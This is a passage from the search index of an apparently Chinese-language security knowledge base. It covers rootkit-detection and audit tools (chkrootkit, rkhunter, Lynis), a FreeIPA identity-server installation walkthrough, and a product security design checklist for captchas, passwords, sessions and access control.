\u6f0f\u6d1e\u751f\u547d\u5468\u671f\u7ba1\u7406","title":"\u626b\u63cf\u53d1\u73b0\u7684\u6f0f\u6d1e\u5982\u4f55\u5f62\u6210\u95ed\u73af"},{"location":"other-security-branch/devsecops/sdc/#_5","text":"\u626b\u63cf\u51fa\u6765\u7684\u6f0f\u6d1e\u53ef\u80fd\u5b58\u5728\u5f88\u591a\u8bef\u62a5\uff0c\u6216\u8005\u6f0f\u6d1e\u5e76\u4e0d\u80fd\u5229\u7528\u6210\u529f\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u518d\u53bb\u624b\u5de5\u9a8c\u8bc1\u6f0f\u6d1e\u8017\u65f6\u3002\u6240\u4ee5\u601d\u8003\u5982\u4f55\u6765\u89e3\u51b3\u6f0f\u6d1e\u51c6\u786e\u6027\u5c31\u6210\u4e86\u4e0b\u4e00\u4e2a\u8981\u89e3\u51b3\u7684\u95ee\u9898\u3002","title":"\u6f0f\u6d1e\u7684\u51c6\u786e\u6027"},{"location":"other-security-branch/devsecops/sdc/#_6","text":"linuxea:gitlab-ci/cd Dependency\u4f9d\u8d56\u626b\u63cf\u4e24\u79cd\u65b9\u5f0f (\u4e94)","title":"\u53c2\u8003\u8d44\u6599"},{"location":"other-security-branch/emergency-response/chkrootkit/","text":"chkrootkit Linux\u5165\u4fb5\u68c0\u6d4b \u68c0\u67e5\u7cfb\u7edf\u4e8c\u8fdb\u5236\u6587\u4ef6\u662f\u5426\u88abrootkit\u75c5\u6bd2\u4fee\u6539\u7684\u4e00\u4e2ashell\u811a\u672c \u5b98\u7f51\u5730\u5740 chkrootkit\u4f7f\u7528 # \u65e0\u9700\u5b89\u88c5\uff0c\u4e0b\u8f7d\u89e3\u538b\u5373\u53ef\u4f7f\u7528 wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz tar -xf chkrootkit.tar.gz cd chkrootkit-0.52 ./chkrootkit -n \u53c2\u6570\u8bf4\u660e -h:\u67e5\u770b\u5e2e\u52a9 -V:\u663e\u793a\u7248\u672c\u4fe1\u606f -l:\u663e\u793a\u53ef\u6d4b\u8bd5\u5185\u5bb9 -d:debug -q:\u5b89\u9759\u6a21\u5f0f -x:\u4e13\u5bb6\u6a21\u5f0f -r dir:\u4f7f\u7528dir\u76ee\u5f55\u4f5c\u4e3a\u6839\u76ee\u5f55 -p dir1:dir2:dirN -n:\u8df3\u8fc7NFS\u6302\u8f7d\u76ee\u5f55","title":"chkrootkit Linux\u5165\u4fb5\u68c0\u6d4b"},{"location":"other-security-branch/emergency-response/chkrootkit/#chkrootkit-linux","text":"\u68c0\u67e5\u7cfb\u7edf\u4e8c\u8fdb\u5236\u6587\u4ef6\u662f\u5426\u88abrootkit\u75c5\u6bd2\u4fee\u6539\u7684\u4e00\u4e2ashell\u811a\u672c \u5b98\u7f51\u5730\u5740","title":"chkrootkit Linux\u5165\u4fb5\u68c0\u6d4b"},{"location":"other-security-branch/emergency-response/chkrootkit/#chkrootkit","text":"# \u65e0\u9700\u5b89\u88c5\uff0c\u4e0b\u8f7d\u89e3\u538b\u5373\u53ef\u4f7f\u7528 wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz tar -xf chkrootkit.tar.gz cd chkrootkit-0.52 ./chkrootkit -n","title":"chkrootkit\u4f7f\u7528"},{"location":"other-security-branch/emergency-response/chkrootkit/#_1","text":"-h:\u67e5\u770b\u5e2e\u52a9 -V:\u663e\u793a\u7248\u672c\u4fe1\u606f -l:\u663e\u793a\u53ef\u6d4b\u8bd5\u5185\u5bb9 -d:debug -q:\u5b89\u9759\u6a21\u5f0f -x:\u4e13\u5bb6\u6a21\u5f0f -r dir:\u4f7f\u7528dir\u76ee\u5f55\u4f5c\u4e3a\u6839\u76ee\u5f55 -p dir1:dir2:dirN -n:\u8df3\u8fc7NFS\u6302\u8f7d\u76ee\u5f55","title":"\u53c2\u6570\u8bf4\u660e"},{"location":"other-security-branch/emergency-response/lynis/","text":"lynis Linux\u5b89\u5168\u5ba1\u8ba1\u5de5\u5177 github\u5730\u5740 \u4f7f\u7528\u65b9\u5f0f git clone https://github.com/CISOfy/Lynis cd Lynis # \u67e5\u770b\u5e2e\u52a9 ./lynis -h # \u6267\u884c\u5ba1\u8ba1 ./lynis audit system","title":"lynis Linux\u5b89\u5168\u5ba1\u8ba1\u5de5\u5177"},{"location":"other-security-branch/emergency-response/lynis/#lynis-linux","text":"github\u5730\u5740","title":"lynis Linux\u5b89\u5168\u5ba1\u8ba1\u5de5\u5177"},{"location":"other-security-branch/emergency-response/lynis/#_1","text":"git clone https://github.com/CISOfy/Lynis cd Lynis # \u67e5\u770b\u5e2e\u52a9 ./lynis -h # \u6267\u884c\u5ba1\u8ba1 ./lynis audit system","title":"\u4f7f\u7528\u65b9\u5f0f"},{"location":"other-security-branch/emergency-response/rkhunter/","text":"rkhunter Linux\u5165\u4fb5\u68c0\u6d4b \u5b98\u7f51\u5730\u5740 \u4e0b\u8f7d\u5730\u5740 \u5b89\u88c5\u4e0e\u4f7f\u7528 centos7\u5b89\u88c5rkhunter wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.6/rkhunter-1.4.6.tar.gz tar -xf rkhunter-1.4.6.tar.gz cd rkhunter-1.4.6 ./installer.sh --install \u4f7f\u7528 # \u68c0\u67e5 rkhunter --check # \u68c0\u67e5\u4e0d\u9700\u8981\u7528\u6237\u6267\u884center\u8fdb\u884c\u786e\u8ba4 rkhunter --check --skip-keypress","title":"rkhunter Linux\u5165\u4fb5\u68c0\u6d4b"},{"location":"other-security-branch/emergency-response/rkhunter/#rkhunter-linux","text":"\u5b98\u7f51\u5730\u5740 \u4e0b\u8f7d\u5730\u5740","title":"rkhunter Linux\u5165\u4fb5\u68c0\u6d4b"},{"location":"other-security-branch/emergency-response/rkhunter/#_1","text":"","title":"\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"other-security-branch/emergency-response/rkhunter/#centos7rkhunter","text":"wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.6/rkhunter-1.4.6.tar.gz tar -xf rkhunter-1.4.6.tar.gz cd rkhunter-1.4.6 ./installer.sh --install","title":"centos7\u5b89\u88c5rkhunter"},{"location":"other-security-branch/emergency-response/rkhunter/#_2","text":"# \u68c0\u67e5 rkhunter --check # \u68c0\u67e5\u4e0d\u9700\u8981\u7528\u6237\u6267\u884center\u8fdb\u884c\u786e\u8ba4 rkhunter --check --skip-keypress","title":"\u4f7f\u7528"},{"location":"other-security-branch/identity-and-access-security/freeipa/","text":"\u57fa\u4e8eLinux\u5f00\u6e90\u8eab\u4efd\u8ba4\u8bc1\u4f53\u7cfbFreeIPA \u5b98\u7f51\u5730\u5740 \u5b89\u88c5\u4e0e\u4f7f\u7528 Centos7\u5b89\u88c5FreeIPA \u5b98\u65b9\u5b89\u88c5\u6587\u6863 # \u914d\u7f6e\u4e00\u4e2aDNS\u89e3\u6790\u8bb0\u5f55 echo 10.10.10.5 ipa.bloodzer0.com ipa /etc/hosts echo ipa.bloodzer0.com /etc/hostname # \u5b89\u88c5ipa-server yum install ipa-server.x86_64 ipa-server-dns.noarch -y # \u5f00\u59cb\u914d\u7f6e\uff0c\u914d\u7f6e\u5728\u4e0b\u6587 ipa-server-install # \u5173\u95ed\u9632\u706b\u5899 setenforce 0 systemctl stop firewalld.service # \u8bbf\u95eehttps://ipa.bloodzer0.com # \u5982\u679c\u4f60\u662f\u5916\u90e8\u8bbf\u95ee\uff0c\u8bb0\u5f97\u5728hosts\u6587\u4ef6\u4e2d\u6dfb\u52a0\u89e3\u6790 # \u7528\u6237\u540d\uff1aadmin \u5bc6\u7801\uff1a\u4f60\u4e4b\u524d\u8bbe\u7f6e\u7684\u5bc6\u7801 \u5b89\u88c5\u8fc7\u7a0b\u4e2d\u7684\u914d\u7f6e Do you want to configure integrated DNS (BIND)? [no]: yes Server host name [ipa.bloodzer0.com]: ipa.bloodzer0.com Please confirm the domain name [bloodzer0.com]: bloodzer0.com Please provide a realm name [BLOODZER0.COM]: BLOODZER0.COM Directory Manager password: # \u8f93\u5165\u4f60\u7684\u5bc6\u7801\uff08\u6d3b\u52a8\u76ee\u5f55\uff09 Password (confirm): # \u786e\u8ba4\u4f60\u7684\u5bc6\u7801 IPA admin password: # ipa admin\u5bc6\u7801 Password (confirm): # \u786e\u8ba4\u5bc6\u7801 Do you want to configure DNS forwarders? [yes]: yes Do you want to configure these servers as DNS forwarders? [yes]: yes Enter an IP address for a DNS forwarder, or press Enter to skip: # \u76f4\u63a5\u56de\u8f66 Do you want to search for missing reverse zones? [yes]: yes Do you want to create reverse zone for IP 10.10.10.5 [yes]: yes Please specify the reverse zone name [10.10.10.in-addr.arpa.]: 10.10.10.in-addr.arpa. Continue to configure the system with these values? [no]: yes # \u914d\u7f6e\u5b8c\u6210\uff0c\u7b49\u5f85\u5b89\u88c5 \u8bbf\u95eeWeb\u754c\u9762 freeipa\u4f7f\u7528 # \u67e5\u770b\u4fe1\u606f ldapsearch -H ldap://ipa.bloodzer0.com -x -D 'cn=Directory Manager' -W -LLL -Z '(uid=admin)' \u8e29\u5751\u8bb0 \u5b89\u88c5\u62a5\u9519 [error] CalledProcessError: Command '/bin/systemctl start certmonger.service' returned non-zero exit status 1 \u89e3\u51b3\u65b9\u6848 # \u5728yum install ipa-server.x86_64 ipa-server-dns.noarch -y\u8fd9\u4e00\u6b65\u540e\u6267\u884c\u5982\u4e0b\u64cd\u4f5c systemctl restart dbus.service","title":"\u57fa\u4e8eLinux\u5f00\u6e90\u8eab\u4efd\u8ba4\u8bc1\u4f53\u7cfbFreeIPA"},{"location":"other-security-branch/identity-and-access-security/freeipa/#linuxfreeipa","text":"\u5b98\u7f51\u5730\u5740","title":"\u57fa\u4e8eLinux\u5f00\u6e90\u8eab\u4efd\u8ba4\u8bc1\u4f53\u7cfbFreeIPA"},{"location":"other-security-branch/identity-and-access-security/freeipa/#_1","text":"","title":"\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"other-security-branch/identity-and-access-security/freeipa/#centos7freeipa","text":"\u5b98\u65b9\u5b89\u88c5\u6587\u6863 # \u914d\u7f6e\u4e00\u4e2aDNS\u89e3\u6790\u8bb0\u5f55 echo 10.10.10.5 ipa.bloodzer0.com ipa /etc/hosts echo ipa.bloodzer0.com /etc/hostname # \u5b89\u88c5ipa-server yum install ipa-server.x86_64 ipa-server-dns.noarch -y # \u5f00\u59cb\u914d\u7f6e\uff0c\u914d\u7f6e\u5728\u4e0b\u6587 ipa-server-install # \u5173\u95ed\u9632\u706b\u5899 setenforce 0 systemctl stop firewalld.service # \u8bbf\u95eehttps://ipa.bloodzer0.com # \u5982\u679c\u4f60\u662f\u5916\u90e8\u8bbf\u95ee\uff0c\u8bb0\u5f97\u5728hosts\u6587\u4ef6\u4e2d\u6dfb\u52a0\u89e3\u6790 # \u7528\u6237\u540d\uff1aadmin \u5bc6\u7801\uff1a\u4f60\u4e4b\u524d\u8bbe\u7f6e\u7684\u5bc6\u7801 \u5b89\u88c5\u8fc7\u7a0b\u4e2d\u7684\u914d\u7f6e Do you want to configure integrated DNS (BIND)? [no]: yes Server host name [ipa.bloodzer0.com]: ipa.bloodzer0.com Please confirm the domain name [bloodzer0.com]: bloodzer0.com Please provide a realm name [BLOODZER0.COM]: BLOODZER0.COM Directory Manager password: # \u8f93\u5165\u4f60\u7684\u5bc6\u7801\uff08\u6d3b\u52a8\u76ee\u5f55\uff09 Password (confirm): # \u786e\u8ba4\u4f60\u7684\u5bc6\u7801 IPA admin password: # ipa admin\u5bc6\u7801 Password (confirm): # \u786e\u8ba4\u5bc6\u7801 Do you want to configure DNS forwarders? [yes]: yes Do you want to configure these servers as DNS forwarders? [yes]: yes Enter an IP address for a DNS forwarder, or press Enter to skip: # \u76f4\u63a5\u56de\u8f66 Do you want to search for missing reverse zones? [yes]: yes Do you want to create reverse zone for IP 10.10.10.5 [yes]: yes Please specify the reverse zone name [10.10.10.in-addr.arpa.]: 10.10.10.in-addr.arpa. Continue to configure the system with these values? [no]: yes # \u914d\u7f6e\u5b8c\u6210\uff0c\u7b49\u5f85\u5b89\u88c5 \u8bbf\u95eeWeb\u754c\u9762","title":"Centos7\u5b89\u88c5FreeIPA"},{"location":"other-security-branch/identity-and-access-security/freeipa/#freeipa","text":"# \u67e5\u770b\u4fe1\u606f ldapsearch -H ldap://ipa.bloodzer0.com -x -D 'cn=Directory Manager' -W -LLL -Z '(uid=admin)'","title":"freeipa\u4f7f\u7528"},{"location":"other-security-branch/identity-and-access-security/freeipa/#_2","text":"","title":"\u8e29\u5751\u8bb0"},{"location":"other-security-branch/identity-and-access-security/freeipa/#_3","text":"[error] CalledProcessError: Command '/bin/systemctl start certmonger.service' returned non-zero exit status 1 \u89e3\u51b3\u65b9\u6848 # \u5728yum install ipa-server.x86_64 ipa-server-dns.noarch -y\u8fd9\u4e00\u6b65\u540e\u6267\u884c\u5982\u4e0b\u64cd\u4f5c systemctl restart dbus.service","title":"\u5b89\u88c5\u62a5\u9519"},{"location":"other-security-branch/security-operation/pst/","text":"\u4ea7\u54c1\u5b89\u5168\u8bbe\u8ba1Checklist \u6839\u636e\u529f\u80fd\u6a21\u5757\u4e0d\u4e00\u81f4\u8fdb\u884c\u7f16\u5199\u3002\uff08\u9700\u8981\u4e0d\u65ad\u6311\u6218\u8bbe\u8ba1\u662f\u5426\u5408\u7406\uff0c\u4e0d\u65ad\u4f18\u5316\uff09 \u901a\u7528\u529f\u80fd \u9a8c\u8bc1\u7801 \u56fe\u5f62\u9a8c\u8bc1\u7801 \u56fe\u5f62\u9a8c\u8bc1\u7801\u5fc5\u987b\u540e\u7aef\u751f\u6210\uff0c\u4e14\u540e\u7aef\u6821\u9a8c\u3002 \u56fe\u5f62\u9a8c\u8bc1\u7801\u751f\u6210\u9700\u8981\u8db3\u591f\u968f\u673a\uff08\u5177\u6709\u4e0d\u53ef\u9884\u6d4b\u6027\uff09\uff0c\u4e14\u5305\u62ec\u4e00\u5b9a\u7684\u5e72\u6270\u5143\u7d20\uff0c\u5982\uff1a\u989c\u8272\u3001\u4f4d\u7f6e\u3001\u6570\u91cf\u7b49\u3002 \u56fe\u5f62\u9a8c\u8bc1\u7801\u5fc5\u987b\u6ee1\u8db3\u6709\u6548\u671f\uff08\u6709\u6548\u65f6\u95f4\u4e0e\u9519\u8bef\u6b21\u6570\uff09\uff0c\u8fc7\u671f\u540e\u7acb\u5373\u5931\u6548\uff1b\u4f7f\u7528\u540e\u5e94\u8be5\u7acb\u5373\u8fc7\u671f\u3002 \u6bcf\u6b21\u8bf7\u6c42\u9700\u8981\u4f7f\u7528\u65b0\u7684\u56fe\u5f62\u9a8c\u8bc1\u7801\u3002 \u77ed\u4fe1/\u90ae\u7bb1\u9a8c\u8bc1\u7801 \u77ed\u4fe1/\u90ae\u7bb1\u9a8c\u8bc1\u7801\u83b7\u53d6\u624b\u673a\u53f7/\u90ae\u7bb1\u5fc5\u987b\u8bbe\u7f6e\u5355\u4f4d\u65f6\u95f4\u5185\u53d1\u9001\u9891\u7387\u3002 \u77ed\u4fe1/\u90ae\u7bb1\u9a8c\u8bc1\u7801\u83b7\u53d6\u624b\u673a\u53f7/\u90ae\u7bb1\u5fc5\u987b\u8bbe\u7f6e\u5355\u4f4d\u65f6\u95f4\u5185\u53d1\u9001\u603b\u91cf\u3002 \u77ed\u4fe1/\u90ae\u7bb1\u9a8c\u8bc1\u7801\u6bcf\u6b21\u968f\u673a\u751f\u6210\u3002 \u77ed\u4fe1/\u90ae\u7bb1\u9a8c\u8bc1\u7801\u5fc5\u987b\u6ee1\u8db3\u6709\u6548\u671f\uff08\u6709\u6548\u65f6\u95f4\u4e0e\u9519\u8bef\u6b21\u6570\uff09\uff0c\u8fc7\u671f\u540e\u7acb\u5373\u5931\u6548\uff1b\u4f7f\u7528\u540e\u5e94\u8be5\u7acb\u5373\u8fc7\u671f\u3002\u5173\u4e8e\u77ed\u4fe1\u9a8c\u8bc1\u7801\u7684\u6709\u6548\u671f\u5efa\u8bae\uff1a4\u4f4d\u4e0d\u8d85\u8fc75\u5206\u949f\u30016\u4f4d\u4e0d\u8d85\u8fc715\u5206\u949f\u3002 \u8bf7\u6c42\u83b7\u53d6\u77ed\u4fe1\u7684\u63a5\u53e3\u5e94\u8be5\u6dfb\u52a0\u56fe\u5f62\u9a8c\u8bc1\u7801\u6216\u6dfb\u52a0\u5176\u5b83\u7684\u98ce\u63a7\u624b\u6bb5\u3002 \u5224\u65ad\u8d26\u6237\u662f\u5426\u5b58\u5728 \u5c3d\u53ef\u80fd\u4e0d\u8981\u5b58\u5728\u6b64\u7c7b\u63a5\u53e3\u3002 \u5982\u679c\u5fc5\u987b\u5b58\u5728\uff0c\u9700\u8981\u5bf9\u6b64\u7c7b\u63a5\u53e3\u6dfb\u52a0\u56fe\u5f62\u9a8c\u8bc1\u7801\u6216\u6dfb\u52a0\u5176\u5b83\u7684\u98ce\u63a7\u624b\u6bb5\u3002 \u5bc6\u7801\u7b56\u7565 \u5bc6\u7801\u957f\u5ea6\u5e94\u8be5\u4e0d\u5c0f\u4e8e8\u4f4d\u3002 \u5bc6\u7801\u590d\u6742\u5ea6\u4e0d\u80fd\u4f4e\u4e8e\u4e09\u8981\u7d20\uff08\u5927\u5c0f\u5199\u5b57\u6bcd+\u6570\u5b57\uff09\uff1b\u6d89\u53ca\u98ce\u9669\u7ea7\u522b\u8f83\u9ad8\u7684\u7cfb\u7edf\u8d26\u6237\u5bc6\u7801\u590d\u6742\u5ea6\u4e0d\u80fd\u4f4e\u4e8e\u56db\u8981\u7d20\uff08\u5927\u5c0f\u5199\u5b57\u6bcd+\u6570\u5b57+\u7279\u6b8a\u5b57\u7b26\uff09\u3002 \u5bc6\u7801\u4e0d\u80fd\u4e0e\u5e38\u89c1\u5f31\u53e3\u4ee4\u5339\u914d\uff0c\u5982\uff1a123456\u3001Qwer1234\u3001Admin@110\u7b49\u3002 \u4f1a\u8bdd\u7ba1\u7406 \u6bcf\u6b21\u4f1a\u8bdd\u751f\u6210\u4e0d\u540c\u7684\u4f1a\u8bddtoken/session\uff0c\u4e14token/session\u5fc5\u987b\u8db3\u591f\u968f\u673a\uff08\u5177\u6709\u4e0d\u53ef\u9884\u6d4b\u6027\uff09\u3002 \u4f1a\u8bddtoken/session\u5fc5\u987b\u8bbe\u7f6e\u5408\u7406\u7684\u8d85\u65f6\u673a\u5236\u3002 \u8d26\u6237\u6ce8\u9500/\u7981\u7528\u540e\u5fc5\u987b\u5f3a\u5236token/session\u8fc7\u671f\u3002 \u5728\u4f1a\u8bddCookie\u4e2d\u6dfb\u52a0 HttpOnly \u4e0e Secure \u5c5e\u6027\u3002 \u662f\u5426\u5141\u8bb8\u8d26\u6237\u591a\u8bbe\u5907\u767b\u5f55\uff0c\u5982\u679c\u5141\u8bb8\u9700\u8981\u9650\u5236\u5e38\u7528\u8bbe\u5907\u3002 \u8bbf\u95ee\u63a7\u5236 \u540e\u53f0\u9875\u9762\u5fc5\u987b\u901a\u8fc7\u8ba4\u8bc1\u540e\u624d\u80fd\u8bbf\u95ee\u3002 \u5fc5\u987b\u9a8c\u8bc1\u8d26\u6237\u662f\u5426\u5177\u5907\u5f53\u524d\u9875\u9762\u7684\u8bbf\u95ee\u6743\u9650\u3002 \u8bf7\u6c42\u4e2d\u4e0d\u5141\u8bb8\u4f7f\u7528\u7528\u6237\u7684userid\u3001phonenum\u3001email\u7b49\u4f5c\u4e3a\u7528\u6237\u7684\u8eab\u4efd\u6807\u8bc6\uff0c\u9700\u8981\u4f7f\u7528token/session\u4f5c\u4e3a\u6807\u8bc6\u3002 \u7528\u6237\u53ea\u5141\u8bb8\u67e5\u770b\u81ea\u5df1\u6240\u62e5\u6709\u6743\u9650\u7684\u529f\u80fd\u3001\u9875\u9762\u3001\u6570\u636e\u3002 \u7528\u6237\u529f\u80fd \u6ce8\u518c \u6ce8\u518c\u8fc7\u7a0b\u4e2d\u9700\u8981\u6821\u9a8c\u7528\u6237\u7684\u8eab\u4efd\uff0c\u5982\u679c\u4e0d\u9700\u8981\u6821\u9a8c\u7684\u6ce8\u518c\u9700\u8981\u6dfb\u52a0\u9a8c\u8bc1\u7801\uff0c\u4e14\u9a8c\u8bc1\u7801\u6ee1\u8db3\u9a8c\u8bc1\u7801\u5b89\u5168\u8981\u6c42\u3002 \u767b\u5f55 \u5408\u7406\u7684\u63d0\u793a\u6587\u6848\uff1a\u4e0d\u8bba\u7528\u6237\u540d\u9519\u8bef\u8fd8\u662f\u5bc6\u7801\u9519\u8bef\uff0c\u7edf\u4e00\u63d0\u793a \u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef \u3002 \u8bbe\u7f6e\u540c\u4e00\u8d26\u53f7\u5355\u4f4d\u65f6\u95f4\u5185\u5141\u8bb8\u767b\u5f55\u5931\u8d25\u7684\u6b21\u6570\uff0c\u901a\u5e38\u4e3a1\u5206\u949f5\u6b21\u3002\u8d85\u8fc7\u6b21\u6570\u540e\u9501\u5b9a\u8d26\u6237\u4e00\u5b9a\u65f6\u95f4\uff08\u901a\u5e38\u4e3a1H\uff09\uff1b\u4e5f\u53ef\u4ee5\u9488\u5bf9\u8be5\u7528\u6237\u5f00\u542f\u53cc\u56e0\u7d20\u6821\u9a8c\u3002 \u8bbe\u7f6e\u540c\u4e00IP\u5355\u4f4d\u65f6\u95f4\u5185\u5141\u8bb8\u767b\u5f55\u5931\u8d25\u7684\u6b21\u6570\uff0c\u901a\u5e38\u4e3a1\u5206\u949f60\u6b21\u3002\u8d85\u8fc7\u6b21\u6570\u540e\u53ef\u4ee5\u9488\u5bf9\u8be5IP\u5f00\u542f\u53cc\u56e0\u7d20\u6821\u9a8c\uff0c\u4e0d\u5efa\u8bae\u76f4\u63a5\u9488\u5bf9IP\u8fdb\u884c\u5c01\u7981\uff0c\u9700\u8981\u989d\u5916\u7684\u9a8c\u8bc1\u3002 \u627e\u56de\u5bc6\u7801 \u5408\u7406\u7684\u627e\u56de\u5bc6\u7801\u903b\u8f91\uff1a\u8f93\u5165\u7528\u6237\u8eab\u4efd\u4fe1\u606f\u3001\u83b7\u53d6\u9a8c\u8bc1\u4fe1\u606f\u3001\u6821\u9a8c\u9a8c\u8bc1\u4fe1\u606f\u3001\u91cd\u7f6e\u5bc6\u7801\u3002 \u5bc6\u7801\u5fc5\u987b\u6ee1\u8db3\u5bc6\u7801\u7b56\u7565\u3002 \u4fee\u6539\u4fe1\u606f \u4fee\u6539\u5bc6\u7801\u65f6\uff1a\u9700\u8981\u6821\u9a8c\u7528\u6237\u7ed1\u5b9a\u7684\u8eab\u4efd\u4fe1\u606f\u3002 \u4fee\u6539\u5bc6\u7801\u65f6\uff1a\u5fc5\u987b\u540c\u65f6\u6821\u9a8c\u539f\u59cb\u5bc6\u7801\uff0c\u4e14\u65b0\u5bc6\u7801\u5e94\u8be5\u6ee1\u8db3\u5bc6\u7801\u7b56\u7565\u3002 \u4fee\u6539\u624b\u673a\u53f7\u65f6\uff1a\u4f18\u5148\u6821\u9a8c\u539f\u624b\u673a\u53f7\uff0c\u5982\u679c\u539f\u624b\u673a\u53f7\u4e0d\u53ef\u7528\uff0c\u53ef\u4ee5\u901a\u8fc7\u5176\u5b83\u65b9\u5f0f\u6765\u6821\u9a8c\u3002 \u4fee\u6539\u624b\u673a\u53f7\u65f6\uff1a\u5fc5\u987b\u6821\u9a8c\u65b0\u7684\u624b\u673a\u53f7\u662f\u5426\u5c5e\u4e8e\u7528\u6237\u6240\u6709\u3002 \u5b9e\u540d\u8ba4\u8bc1 \u9700\u8981\u591a\u91cd\u7684\u6821\u9a8c\u624b\u6bb5\uff0c\u5982\uff1a\u8eab\u4efd\u8bc1\u7167\u7247+\u624b\u6301\u8eab\u4efd\u8bc1\u7167\u7247\u3002 \u7528\u6237\u7684\u8eab\u4efd\u4fe1\u606f\u9700\u8981\u6ee1\u8db3\u4f20\u8f93\u5b89\u5168\u3001\u6570\u636e\u5b58\u50a8\u5b89\u5168\u4e0e\u6570\u636e\u4f7f\u7528\u5b89\u5168\u3002 \u4ea4\u6613\u529f\u80fd \u672a\u5f00\u59cb\u7f16\u5199\u3002 \u5145\u503c/\u63d0\u73b0\u529f\u80fd \u7535\u5546\u8d2d\u7269\u529f\u80fd \u7981\u6b62\u8d2d\u4e70\u5df2\u4e0b\u67b6\u7684\u5546\u54c1\u3002 \u5176\u5b83\u529f\u80fd \u65e5\u5fd7\u529f\u80fd \u9700\u8981\u8bb0\u5f55\u7528\u6237\u65e5\u5fd7\u6570\u636e\u65b9\u4fbf\u540e\u671f\u5ba1\u8ba1\u3002 \u65e5\u5fd7\u6570\u636e\u5b58\u50a8\u9700\u8981\u6ee1\u8db3\u5408\u7406\u7684\u65f6\u957f\u3002 \u65e5\u5fd7\u4e2d\u7981\u6b62\u8bb0\u5f55\u654f\u611f\u4fe1\u606f\uff0c\u5982\uff1a\u7528\u6237\u8eab\u4efd\u4fe1\u606f\u3001\u7528\u6237\u8d26\u53f7\u5bc6\u7801\u4fe1\u606f\u7b49\u3002 \u5b89\u5168\u4f20\u8f93\u529f\u80fd \u4e1a\u52a1\u7cfb\u7edf\u91c7\u7528\u5168\u7ad9https\u3002 \u654f\u611f\u6570\u636e\uff08\u7528\u6237\u7684\u8d26\u53f7\u5bc6\u7801\u3001token/session\u3001\u8eab\u4efd\u4fe1\u606f\u7b49\uff09\u9700\u8981\u4ee5http post\u7684\u65b9\u5f0f\u63d0\u4ea4\u3002 \u6570\u636e\u5b58\u50a8\u5b89\u5168 \u654f\u611f\u6570\u636e\u9700\u8981\u52a0\u5bc6\u4fdd\u5b58\uff0c\u4e14\u52a0\u5bc6\u7b97\u6cd5\u6ee1\u8db3\u7b97\u6cd5\u5b89\u5168\u9700\u6c42\u3002 \u6570\u636e\u4f7f\u7528\u5b89\u5168 \u654f\u611f\u6570\u636e\u8131\u654f\u5c55\u793a\u3002 \u4e0a\u4f20/\u4e0b\u8f7d \u4e0a\u4f20\u6587\u4ef6\u5e94\u8be5\u6ee1\u8db3\u683c\u5f0f\u8981\u6c42\uff0c\u4e0d\u5141\u8bb8\u7528\u6237\u4e0a\u4f20\u811a\u672c\u7c7b\u578b\u6587\u4ef6\u3002 \u9650\u5236\u4e0b\u8f7d\u6587\u4ef6\u8def\u5f84\u4e0e\u4e0b\u8f7d\u6587\u4ef6\u7684\u6743\u9650\u3002 \u5bfc\u5165/\u5bfc\u51fa \u9650\u5236\u7528\u6237\u5355\u4f4d\u65f6\u95f4\u5185\u5bfc\u51fa\u6570\u636e\u3002 \u6821\u9a8c\u7528\u6237\u5bfc\u5165\u6570\u636e\u683c\u5f0f\u3002 \u7b97\u6cd5\u5b89\u5168 \u4e0d\u8981\u4f7f\u7528\u4e0d\u5b89\u5168\u7684\u7b97\u6cd5\u8fdb\u884c\u52a0\u5bc6\uff1aMD5\u3001DES\u3001SHA1\u7b49\uff0c\u63a8\u8350\u4f7f\u7528\uff1aAES128\u3001RSA2048\u3001DSA2048\u3002 \u4e0d\u8981\u4f7f\u7528\u79c1\u6709\u52a0\u5bc6\u7b97\u6cd5\u3002 \u5907\u6ce8 \u7528\u6237\u8eab\u4efd\u4fe1\u606f\uff1a\u624b\u673a\u53f7\u3001\u90ae\u7bb1\u3001\u8eab\u4efd\u8bc1\u53f7\u7b49\u3002 \u53c2\u8003\u8d44\u6599 \u672c\u6587\u53c2\u8003\u4e86VIPKID\u7684\u5b89\u5168\u8bbe\u8ba1\u7ea2\u7ebf\u3002 \u5b89\u5168\u8bbe\u8ba1Checklist \u91d1\u878d\u79d1\u6280SDL\u5b89\u5168\u8bbe\u8ba1checklist","title":"\u4ea7\u54c1\u5b89\u5168\u8bbe\u8ba1Checklist"},{"location":"other-security-branch/security-operation/pst/#checklist","text":"\u6839\u636e\u529f\u80fd\u6a21\u5757\u4e0d\u4e00\u81f4\u8fdb\u884c\u7f16\u5199\u3002\uff08\u9700\u8981\u4e0d\u65ad\u6311\u6218\u8bbe\u8ba1\u662f\u5426\u5408\u7406\uff0c\u4e0d\u65ad\u4f18\u5316\uff09","title":"\u4ea7\u54c1\u5b89\u5168\u8bbe\u8ba1Checklist"},{"location":"other-security-branch/security-operation/pst/#_1","text":"","title":"\u901a\u7528\u529f\u80fd"},{"location":"other-security-branch/security-operation/pst/#_2","text":"","title":"\u9a8c\u8bc1\u7801"},{"location":"other-security-branch/security-operation/pst/#_3","text":"\u56fe\u5f62\u9a8c\u8bc1\u7801\u5fc5\u987b\u540e\u7aef\u751f\u6210\uff0c\u4e14\u540e\u7aef\u6821\u9a8c\u3002 \u56fe\u5f62\u9a8c\u8bc1\u7801\u751f\u6210\u9700\u8981\u8db3\u591f\u968f\u673a\uff08\u5177\u6709\u4e0d\u53ef\u9884\u6d4b\u6027\uff09\uff0c\u4e14\u5305\u62ec\u4e00\u5b9a\u7684\u5e72\u6270\u5143\u7d20\uff0c\u5982\uff1a\u989c\u8272\u3001\u4f4d\u7f6e\u3001\u6570\u91cf\u7b49\u3002 \u56fe\u5f62\u9a8c\u8bc1\u7801\u5fc5\u987b\u6ee1\u8db3\u6709\u6548\u671f\uff08\u6709\u6548\u65f6\u95f4\u4e0e\u9519\u8bef\u6b21\u6570\uff09\uff0c\u8fc7\u671f\u540e\u7acb\u5373\u5931\u6548\uff1b\u4f7f\u7528\u540e\u5e94\u8be5\u7acb\u5373\u8fc7\u671f\u3002 